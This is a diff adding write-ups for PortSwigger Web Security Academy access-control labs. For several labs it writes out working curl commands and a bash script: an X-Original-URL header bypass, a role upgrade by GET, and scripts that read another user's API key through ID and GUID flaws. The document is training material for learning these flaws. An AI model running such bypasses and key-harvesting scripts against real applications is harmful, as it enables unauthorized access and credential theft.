@@ -437,8 +437,86 @@ Role should be bound on the backend to the specific session. It shouldn't be pos
 
 **Vulnerability**
 
-Broken access control.
+The backend supports legacy `X-Original-URL` header. Details [here](https://www.acunetix.com/vulnerabilities/web/url-rewrite-vulnerability/).
 
 **Exploitation**
+
+```
+curl -H 'X-Original-URL: /admin/delete' -L -k -x 127.0.0.1:8081 https://ac471fb31f0ddf40c0ee5cda006b0015.web-security-academy.net/?username=carlos
+```
+
+**Mitigation**
+
+Drop support for `X-Original-URL` header.
+
+### Lab: Method-based access control can be circumvented
+
+**Target**
+
+    https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented
+
+**Vulnerability**
+
+Broken access control for `GET` http metchod.
+
+**Exploitation**
+
+    curl -L -k -x 127.0.0.1:8081 https://ac911f011eed636ec0b35e63005b00d8.web-security-academy.net/admin-roles?username=wiener&action=upgrade
+
+**Mitigation**
+
+### Lab: User ID controlled by request parameter
+
+**Target**
+
+    https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter
+
+**Vulnerability**
+
+**Exploitation**
+
+1. Set up Burp to provide authentication engine for command line tools (see: [here](https://blog.z-labs.eu/2022/01/12/burp-suite-pro-authn-for-cli-tools.html)
+2. Log in via browser to the vulnerable application.
+3. Exploit:
+
+```
+KEY=$(curl -s -k -x 127.0.0.1:8081 https://ac551fec1ffeda0ac0d82a8b004e00a0.web-security-academy.net/my-account?id=carlos | grep 'API Key' | cut -d'<' -f2 | awk -F' ' '{print $NF}'); curl -k -x 127.0.0.1:8081 https://ac551fec1ffeda0ac0d82a8b004e00a0.web-security-academy.net/submitSolution -d "answer=$KEY" 
+```
+
+**Mitigation**
+
+### Lab: User ID controlled by request parameter, with unpredictable user IDs
+
+**Target**
+
+    https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids
+
+**Vulnerability**
+
+Broken access control. Horizontal escalation. GUID for other user (`carlos`) is leaked in blog content.
+
+**Exploitation**
+
+1. Set up Burp to provide authentication engine for command line tools (see: [here](https://blog.z-labs.eu/2022/01/12/burp-suite-pro-authn-for-cli-tools.html) for details).
+2. Log in via browser to the vulnerable application.
+3. Exploit:
+
+```
+cat > labSolution-user-id-controlled-by-request-parameter-with-unpredictable-user-ids.sh <<'EOF'
+#!/bin/bash
+
+URL=https://ac6e1f381f2ddfa3c0f690be00630094.web-security-academy.net
+
+# search thru blog posts to find GUID for user carlos:
+GUID=$(for i in $(seq 1 10); do curl -s -k -x 127.0.0.1:8081 ${URL}/post?postId=$i | grep userId; done | grep carlos | head -n 1 | cut -d"'" -f2 | cut -d'=' -f2)
+
+# get carlos API key:
+KEY=$(curl -s -k -x 127.0.0.1:8081 $URL/my-account?id=$GUID | grep 'API Key' | cut -d'<' -f2 | awk -F' ' '{print $NF}')
+
+# submit solution:
+curl -k -x 127.0.0.1:8081 $URL/submitSolution -d "answer=$KEY"
+
+EOF
+```
 
 **Mitigation**
